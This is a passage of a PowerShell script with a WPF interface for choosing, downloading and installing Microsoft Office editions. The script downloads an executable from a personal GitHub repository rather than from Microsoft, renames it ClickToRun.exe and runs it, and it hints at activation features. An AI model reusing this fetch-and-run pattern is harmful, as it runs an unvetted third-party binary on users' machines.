                <RadioButton x:Name="radioButton2021Outlook" Content="Outlook" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="212" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021Access" Content="Access" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="232" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021Publisher" Content="Publisher" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="252" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021HomeStudent" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="272" Content="HomeStudent" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2021HomeBusiness" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="342" Canvas.Top="295" Content="HomeBusiness" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Rectangle Height="306" Stroke="#FF164A69" Width="150" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="493" Canvas.Top="20" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="Label2019" Content="Office 2019" FontWeight="Bold" Canvas.Left="503" Background="#FF0F8E40" Canvas.Top="8" HorizontalAlignment="Left" VerticalAlignment="Center" Foreground="White" Padding="8,4,8,4"/>
                <RadioButton x:Name="radioButton2019Pro" Content="Professional Plus" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="35" VerticalContentAlignment="Center" VerticalAlignment="Center" HorizontalAlignment="Left"/>
                <RadioButton x:Name="radioButton2019Std" Content="Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="55" VerticalAlignment="Center" HorizontalAlignment="Left"/>
                <RadioButton x:Name="radioButton2019ProjectPro" Content="Project Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="75" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019ProjectStd" Content="Project Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="95" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019VisioPro" Content="Visio Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="115" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019VisioStd" Content="Visio Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="135" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019Word" Content="Word" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="155" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019Excel" Content="Excel" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="175" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019PowerPoint" Content="PowerPoint" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="195" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019Outlook" Content="Outlook" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="213" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019Access" Content="Access" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="235" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019Publisher" Content="Publisher" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="255" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019HomeStudent" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="275" Content="HomeStudent" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2019HomeBusiness" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Left="504" Canvas.Top="295" Content="HomeBusiness" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Rectangle Height="306" Stroke="#FF164A69" Width="150" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="659" Canvas.Top="20" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="Label2016" Content="Office 2016" FontWeight="Bold" Canvas.Left="669" Background="#FFA28210" Canvas.Top="8" HorizontalAlignment="Left" VerticalAlignment="Center" Padding="8,4,8,4" Foreground="White"/>
                <RadioButton x:Name="radioButton2016Pro" Content="Professional Plus" IsChecked="False" Padding="5,5,5,5" VerticalContentAlignment="Center" Canvas.Left="672" Canvas.Top="35" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Std" Content="Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="55" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016ProjectPro" Content="Project Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="75" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016ProjectStd" Content="Project Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="95" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016VisioPro" Content="Visio Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="115" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016VisioStd" Content="Visio Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="135" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Word" Content="Word" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="155" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Excel" Content="Excel" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="175" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016PowerPoint" Content="PowerPoint" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="195" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Outlook" Content="Outlook" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="212" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Access" Content="Access" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="235" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016Publisher" Content="Publisher" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="255" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2016OneNote" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Content="OneNote" Canvas.Top="275" Canvas.Left="672" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Rectangle Height="306" Stroke="#FF164A69" Width="150" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Canvas.Left="825" Canvas.Top="20" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="Label2013" Content="Office 2013" FontWeight="Bold" Canvas.Left="836" Background="#FF1B0F0F" Canvas.Top="8" HorizontalAlignment="Left" VerticalAlignment="Center" Foreground="White" Padding="8,4,8,4"/>
                <RadioButton x:Name="radioButton2013Pro" Content="Professional" IsChecked="False" Padding="5,5,5,5" VerticalContentAlignment="Center" Canvas.Left="836" Canvas.Top="35" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Std" Content="Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="55" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013ProjectPro" Content="Project Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="75" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013ProjectStd" Content="Project Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="95" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013VisioPro" Content="Visio Pro" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="115" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013VisioStd" Content="Visio Standard" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="135" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Word" Content="Word" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="155" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Excel" Content="Excel" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="175" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013PowerPoint" Content="PowerPoint" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="195" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Outlook" Content="Outlook" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="215" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Access3" Content="Access" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="235" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <RadioButton x:Name="radioButton2013Publisher" Content="Publisher" VerticalContentAlignment="Center" IsChecked="False" Padding="5,5,5,5" Canvas.Top="255" Canvas.Left="836" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Label x:Name="label1" Content=" + By default, this script installs the 64-bit version in English." Canvas.Top="347" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label2" Content=" + Default mode is Install. If you want to download only, select Download mode." Canvas.Top="367" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label3" Content=" + The downloaded files would be saved on the current user's desktop." Canvas.Top="386" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label4" Content=" + The script can download/ install both Retail and Volume versions." Canvas.Top="404" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" HorizontalAlignment="Center" VerticalAlignment="Top" Canvas.Left="-3" Padding="0,0,0,2"/>
                <Label x:Name="label5" Content=" + ReCreate by: SARGA X HINZDC AKA OLIH | Website: " Canvas.Top="423" FontSize="10.5" BorderBrush="{x:Null}" Background="{x:Null}" Canvas.Left="-3" HorizontalAlignment="Center" VerticalAlignment="Top" Padding="0,0,0,2"/>
                <Rectangle x:Name="RemoveAll" Stroke="#FFDC281F" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Height="141" Width="136" Canvas.Top="143" Canvas.Left="10" HorizontalAlignment="Center" VerticalAlignment="Top"/>
                <RadioButton x:Name="radioButtonRemoveAllApp" Content="I Agree (Caution!)" FontFamily="Consolas" FontSize="10" VerticalContentAlignment="Center" IsChecked="False" Canvas.Left="19" Canvas.Top="155" HorizontalAlignment="Center" VerticalAlignment="Top"/>
                <TextBlock x:Name="textBoxRemoveAll" TextWrapping="Wrap" Text="*This option removes all installed Office apps." FontSize="10" Canvas.Left="10" Canvas.Top="289" Foreground="#FFED551B" HorizontalAlignment="Center" VerticalAlignment="Top" FontWeight="Bold" Height="30" Width="134"/>
                <Label x:Name="LabelRemoveAll" Content="Remove All Apps:" FontWeight="Bold" Canvas.Left="24" Canvas.Top="130" HorizontalAlignment="Center" VerticalAlignment="Top" Background="White"/>
                <Button x:Name="buttonRemoveAll" Content="Remove All"
                    Width="107" Height="27" BorderBrush="{x:Null}"
                    FontSize="10" HorizontalAlignment="Center"
                    Canvas.Left="24" Canvas.Top="180" VerticalAlignment="Top"
                    Style="{StaticResource RedButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>
                <Image x:Name="image" Height="80" Width="80" Canvas.Left="870" Canvas.Top="345" Source="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/office.ico" HorizontalAlignment="Left" VerticalAlignment="Top" Visibility="Hidden">
                <Image.RenderTransform>
                        <RotateTransform CenterX="40" CenterY="40"/>
                    </Image.RenderTransform>
                </Image>
                <Image x:Name="image2" Panel.ZIndex="2" Height="200" Width="129" Canvas.Left="501" Canvas.Top="263" Source="https://raw.githubusercontent.com/hinzdc/get/refs/heads/main/image/tom.png" HorizontalAlignment="Left" VerticalAlignment="Center" Visibility="Visible"/>
                <Rectangle x:Name="submitbox" Stroke="#FF164A69" UseLayoutRounding="True" RadiusX="5" RadiusY="5" Height="91" Width="382" Canvas.Top="340" Canvas.Left="593" HorizontalAlignment="Left" VerticalAlignment="Center"/>
                <Button x:Name="buttonSARA" Content="SaRa"
                    IsEnabled="False"
                    Width="107" Height="27" BorderBrush="{x:Null}"
                    FontSize="10"
                    Canvas.Left="24" Canvas.Top="244"
                    Style="{StaticResource GreyButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500" HorizontalAlignment="Center" VerticalAlignment="Top">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>
                <Button x:Name="buttonScrub" Content="Scrub All"
                    Width="107" Height="26" BorderBrush="{x:Null}"
                    IsEnabled="False"
                    FontSize="10"
                    Canvas.Left="24" Canvas.Top="213"
                    Style="{StaticResource GreyButtonStyle}" Cursor="Hand"
                    ToolTipService.ShowDuration="5000" 
                    ToolTipService.InitialShowDelay="500" HorizontalAlignment="Center" VerticalAlignment="Top">
                    <Button.ToolTip>
                        <ToolTip Content="Klik untuk mengapus tingkat lanjut semua aplikasi Office yang terinstall." />
                    </Button.ToolTip>
                </Button>
            </Canvas>
        </GroupBox>
        <GroupBox x:Name="groupBoxArch" Header="Arch:" Margin="10,10,0,0" BorderBrush="#FF0D4261" HorizontalAlignment="Left" VerticalAlignment="Top" FontFamily="Consolas" FontSize="11" Width="104">
            <StackPanel HorizontalAlignment="Left" VerticalAlignment="Top">
                <RadioButton x:Name="radioButtonArch64" Content="x64" Width="37" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0" VerticalContentAlignment="Center" IsChecked="True"/>
                <RadioButton x:Name="radioButtonArch32" Content="x32" Width="37" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,5" VerticalContentAlignment="Center"/>
            </StackPanel>
        </GroupBox>
        <GroupBox x:Name="groupBoxLicenseType" Header="LicenseType:" Margin="10,87,0,0" BorderBrush="#FF0D4261" HorizontalAlignment="Left" VerticalAlignment="Top" FontFamily="Consolas" FontSize="11" Width="104" Height="65">
            <StackPanel HorizontalAlignment="Left" VerticalAlignment="Top">
                <RadioButton x:Name="radioButtonRetail" Content="Retail" HorizontalAlignment="Left" VerticalAlignment="Top" VerticalContentAlignment="Center" IsChecked="True" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonVolume" Content="Volume" HorizontalAlignment="Left" VerticalAlignment="Top" VerticalContentAlignment="Center" Margin="5,6,0,0"/>
            </StackPanel>
        </GroupBox>
        <GroupBox x:Name="groupBoxMode" Header="Mode:" Margin="10,161,0,0" BorderBrush="#FF0D4261" HorizontalAlignment="Left" VerticalAlignment="Top" FontFamily="Consolas" FontSize="11" Width="104" Height="67" ToolTip="When selecting the Activate mode...">
            <StackPanel HorizontalAlignment="Left" VerticalAlignment="Top">
                <RadioButton x:Name="radioButtonInstall" Content="Install" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0" VerticalContentAlignment="Center" IsChecked="True"/>
                <RadioButton x:Name="radioButtonDownload" Content="Download" VerticalContentAlignment="Center" Margin="5,6,0,0"/>
            </StackPanel>
        </GroupBox>
        <GroupBox x:Name="groupBoxLanguage" Header="Language:" Margin="10,239,0,0" BorderBrush="#FF0D4261" HorizontalAlignment="Left" VerticalAlignment="Top" FontFamily="Consolas" FontSize="11" Width="104" Height="229">
            <StackPanel HorizontalAlignment="Left" VerticalAlignment="Top">
                <RadioButton x:Name="radioButtonEnglish" Content="English" VerticalContentAlignment="Center" IsChecked="True" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,8,0,0"/>
                <RadioButton x:Name="radioButtonIndonesian" Content="Indonesian" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonKorean" Content="Korean" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonChinese" Content="Chinese" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonFrench" Content="French" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonSpanish" Content="Spanish" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonHindi" Content="Hindi" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonGerman" Content="German" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonJapanese" Content="Japanese" VerticalContentAlignment="Center" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="5,6,0,0"/>
                <RadioButton x:Name="radioButtonVietnamese" Content="Vietnamese" VerticalContentAlignment="Center" Margin="5,6,0,0"/>
            </StackPanel>
        </GroupBox>
        <Button x:Name="buttonSubmit" Content="SUBMIT" 
            Width="118" Height="59" 
            FontSize="13" FontWeight="Bold" HorizontalAlignment="Left" 
            Margin="974,381,0,0" VerticalAlignment="Top"
            Style="{StaticResource GreenButtonStyle}" Cursor="Hand"
            ToolTipService.ShowDuration="5000" 
            ToolTipService.InitialShowDelay="500">
            <Button.ToolTip>
                <ToolTip Content="Klik untuk menginstal atau mendownload office yang dipilih." />
            </Button.ToolTip>
        </Button>

        <ProgressBar x:Name="progressbar" HorizontalAlignment="Left" Height="15" Margin="740,384,0,0" VerticalAlignment="Top" Width="218" IsEnabled="False" Background="Gainsboro" BorderBrush="{x:Null}"/>
        <TextBox x:Name="textbox" TextWrapping="Wrap" Text="Silakan pilih salah satu versi office yang ingin diinstall lalu klik SUBMIT." Width="218" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="740,406,0,0" FontFamily="Consolas" FontSize="11" HorizontalContentAlignment="Center" VerticalContentAlignment="Center" Background="{x:Null}" BorderBrush="{x:Null}" AllowDrop="False" Focusable="False" IsHitTestVisible="False" IsTabStop="False" IsUndoEnabled="False"/>
        <TextBox x:Name="textboxlog" TextWrapping="Wrap" Width="218" HorizontalAlignment="Left" VerticalAlignment="Top" Margin="740,425,0,0" FontFamily="Consolas" FontSize="9" HorizontalContentAlignment="Center" VerticalContentAlignment="Center" Background="{x:Null}" BorderBrush="{x:Null}" AllowDrop="False" Focusable="False" IsHitTestVisible="False" IsTabStop="False" IsUndoEnabled="False"/>
        <Label x:Name="Link1" HorizontalAlignment="Left" Margin="398,443,0,0" VerticalAlignment="Top" Width="172" FontSize='10.5' FontFamily="Consolas" Padding="5,5,5,2">
            <Hyperlink NavigateUri="https://hinzdc.xyz">www.indojava.online</Hyperlink>
        </Label>

    </Grid>
</Window>

'@

# Memuat XAML
[xml]$xaml = $xamlInput -replace '^<Window.*', '<Window' -replace 'mc:Ignorable="d"','' -replace "x:Name",'Name'
$xmlReader = (New-Object System.Xml.XmlNodeReader $xaml)
$Form = [Windows.Markup.XamlReader]::Load( $xmlReader )

# Store form objects (variables) in PowerShell
    $xaml.SelectNodes("//*[@Name]") | ForEach-Object -Process {
        Set-Variable -Name ($_.Name) -Value $Form.FindName($_.Name)
    }

$Link1.Add_PreviewMouseDown({[system.Diagnostics.Process]::start('https://hinzdc.xyz')})

# Get the Storyboard resource
$storyboard = $Form.FindResource("RotateStoryboard")

# Set the target for the storyboard animation
[Windows.Media.Animation.Storyboard]::SetTarget($storyboard, $Form.FindName("image"))

# Start the animation
$storyboard.Begin()

# Download links
    $uri = "https://github.com/hinzdc/get/raw/main/office/bin/setup.exe"
    $uri2013 = "https://github.com/hinzdc/get/raw/main/office/bin/bin2013.exe"
    # $uninstall = './scripts/office/uninstall.bat'
    # $readme = './scripts/office/Readme.txt'

# Prepiaration for download and install
    function PreparingOffice {
        if ($radioButtonDownload.IsChecked) {
            $workingDir = New-Item -Path $env:userprofile\Desktop\$productId -ItemType Directory -Force
            Set-Location $workingDir
            Invoke-Item $workingDir
        }

        if ($radioButtonInstall.IsChecked) {
            $workingDir = New-Item -Path $env:temp\ClickToRun\$productId -ItemType Directory -Force
            Set-Location $workingDir
        }

        $configurationFile = "configuration-x$arch.xml"
        New-Item $configurationFile -ItemType File -Force | Out-Null
        Add-Content $configurationFile -Value "<Configuration>"
        Add-content $configurationFile -Value "<Add OfficeClientEdition=`"$arch`" Channel=`"Current`">"
        Add-content $configurationFile -Value "<Product ID=`"$productId`">"
        Add-content $configurationFile -Value "<Language ID=`"$languageId`"/>"
        Add-Content $configurationFile -Value '</Product>'
        Add-Content $configurationFile -Value '</Add>'
        Add-Content $configurationFile -Value "<Property Name=`"FORCEAPPSHUTDOWN`" Value=`"TRUE`" />"
        Add-Content $configurationFile -Value '<Updates Enabled="TRUE" />'
        Add-Content $configurationFile -Value '<Display Level="Full" AcceptEULA="TRUE" />'
        Add-Content $configurationFile -Value '</Configuration>'

        $batchFile = "Install-x$arch.bat"
        New-Item $batchFile -ItemType File -Force | Out-Null
        Add-content $batchFile -Value "ClickToRun.exe /configure $configurationFile"

        (New-Object Net.WebClient).DownloadFile($uri, "$workingDir\ClickToRun.exe")
        # (New-Object Net.WebClient).DownloadFile($readme, "$workingDir\01.Readme.txt")

        $sync.configurationFile = $configurationFile
        $sync.workingDir = $workingDir
    }
    
# Creating script block for download and install
    $DownloadInstallOffice = {
        function Write-HostDebug {
            #Helper function to write back to the host debug output
            param([Parameter(Mandatory)]
            [string]
            $debugMessage)
            if ($sync.DebugPreference) {
                $sync.host.UI.WriteDebugLine($debugMessage)
            }
        }

        function Write-VerboseDebug {
            param([Parameter(Mandatory)]
            [string]
            $verboseMessage)
            if ($sync.VerbosePreference) {
                $sync.host.UI.WriteVerboseLine($verboseMessage)
            }
        }

        Write-VerboseDebug "Downloading the $($sync.productName)"
        Write-VerboseDebug "Mode: $($sync.mode)"
        Write-VerboseDebug "Configuration file: $($sync.configurationFile)"

        # To referece our elements we use the $sync variable from hashtable.
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "$($sync.UIstatus) $($sync.productName) $($sync.arch)-bit ($($sync.language))" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.BorderBrush = "#FF707070" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $true })
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Visible" })

        Set-Location -Path $($sync.workingDir)
        Write-VerboseDebug "Working (download) path: $pwd"
        Write-VerboseDebug "Command to run: .\ClickToRun.exe $($sync.mode) .\$($sync.configurationFile)"

        Start-Process -FilePath .\ClickToRun.exe -ArgumentList "$($sync.mode) .\$($sync.configurationFile)" -NoNewWindow -Wait
                
        # Bring back our Button, set the Label and ProgressBar, we're done..
        $sync.Form.Dispatcher.Invoke([action] { $sync.image.Visibility = "Hidden" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Visibility = 'Visible' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.buttonSubmit.Content = 'SUBMIT' })
        $sync.Form.Dispatcher.Invoke([action] { $sync.textbox.Text = "$($sync.UIstatus) Completed" })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.IsIndeterminate = $false })
        $sync.Form.Dispatcher.Invoke([action] { $sync.ProgressBar.Value = '100' })

        Write-VerboseDebug "Done. You can close this window now."
        Write-Host " Done. You can close this window now."
    }

# Share info between runspaces
    $sync = [hashtable]::Synchronized(@{})
    $sync.runspace = $runspace
    $sync.host = $host
    $sync.Form = $Form
    $sync.ProgressBar = $ProgressBar
    $sync.textbox = $textbox
    $sync.textboxlog = $textboxlog
    $sync.image = $image
    $sync.buttonSubmit = $buttonSubmit
    $sync.DebugPreference = $DebugPreference
    $sync.VerbosePreference = $VerbosePreference

# Build a runspace
    $runspace = [runspacefactory]::CreateRunspace()
    $runspace.ApartmentState = 'STA'
    $runspace.ThreadOptions = 'ReuseThread'
    $runspace.Open()

# Add shared data to the runspace
    $runspace.SessionStateProxy.SetVariable("sync", $sync)

# Create a Powershell instance
    $PSIinstance = [powershell]::Create().AddScript($scriptBlock)
    $PSIinstance.Runspace = $runspace
    
# Event handler untuk perubahan pilihan RadioButton
$radioButtonDownload.Add_Checked({
    UpdateButtonState
})

$radioButtonInstall.Add_Checked({
    UpdateButtonState
})

# Fungsi untuk memperbarui teks tombol berdasarkan pilihan RadioButton
function UpdateButtonState {
    if ($radioButtonDownload.IsChecked) {
        $buttonText = 'DOWNLOAD'
    }
    elseif ($radioButtonInstall.IsChecked) {
        $buttonText = 'INSTALL'
    }
    else {
        return  # Jika tidak ada radio button yang dipilih, keluar dari fungsi
    }

    # Gunakan Dispatcher untuk memperbarui UI di thread utama
    $sync.Form.Dispatcher.Invoke([action] { 
        $sync.buttonSubmit.Content = $buttonText 
    })
}

# INSTALL/DOWNLOAD/ACTIVATE Microsoft Office with a runspace

    $buttonSubmit.Add_Click( {
            $i = 0
            if ($radioButtonArch64.IsChecked) {$arch = '64'}
            if ($radioButtonArch32.IsChecked) {$arch = '32'}

            if ($radioButtonRetail.IsChecked) {$licType = 'Retail'}
            if ($radioButtonVolume.IsChecked) {$licType = 'Volume'}

            if ($radioButtonEnglish.IsChecked) {$languageId="en-US"; $language = 'English'}
            if ($radioButtonIndonesian.IsChecked) {$languageId="id-ID"; $language = 'Indonesian'}
            if ($radioButtonJapanese.IsChecked) {$languageId="ja-JP"; $language = 'Japanese'}
            if ($radioButtonKorean.IsChecked) {$languageId="ko-KR"; $language = 'Korean'}
            if ($radioButtonChinese.IsChecked) {$languageId="zh-TW"; $language = 'Chinese'}
            if ($radioButtonFrench.IsChecked) {$languageId="fr-FR"; $language = 'French'}
            if ($radioButtonSpanish.IsChecked) {$languageId="es-ES"; $language = 'Spanish'}
            if ($radioButtonHindi.IsChecked) {$languageId="hi-IN"; $language = 'Hindi'}
            if ($radioButtonGerman.IsChecked) {$languageId="de-DE"; $language = 'German'}
            if ($radioButtonVietnamese.IsChecked) {$languageId="vi-VN"; $language = 'Vietnamese'}

            if ($radioButtonDownload.IsChecked) {$mode = '/download'; $UIstatus = 'Downlading'}
            if ($radioButtonInstall.IsChecked) {$mode = '/configure'; $UIstatus = 'Installing'}

        # For Microsoft 365
            if ($radioButton365Home.IsChecked -eq $true) {$productId = "O365HomePremRetail"; $productName = 'Microsoft 365 Home'; $i++}
            if ($radioButton365Business.IsChecked -eq $true) {$productId = "O365BusinessRetail"; $productName = 'Microsoft 365 Apps for Business'; $i++}
            if ($radioButton365Enterprise.IsChecked -eq $true) {$productId = "O365ProPlusRetail"; $productName = 'Microsoft 365 Apps for Enterprise'; $i++}

        # For Office 2024
